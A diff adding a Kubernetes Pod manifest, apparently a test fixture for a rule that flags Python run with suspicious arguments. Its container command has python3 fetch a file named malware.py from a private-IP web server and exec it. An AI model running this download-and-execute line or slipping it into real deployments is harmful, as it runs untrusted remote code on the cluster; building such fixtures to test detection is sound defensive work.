@@ -1,0 +1,11 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: python-executed-with-suspicious-arguments
+spec:
+  containers:
+  - name: python-executed-with-suspicious-arguments
+    image: angelrita/base-ubuntu:latest
+    #imagePullPolicy: Never
+    command: ['sh']
+    args: ["-c", "python3 -c 'import urllib.request; exec(urllib.request.urlopen(\"http://10.113.107.226:8000/malware.py\").read())'"]
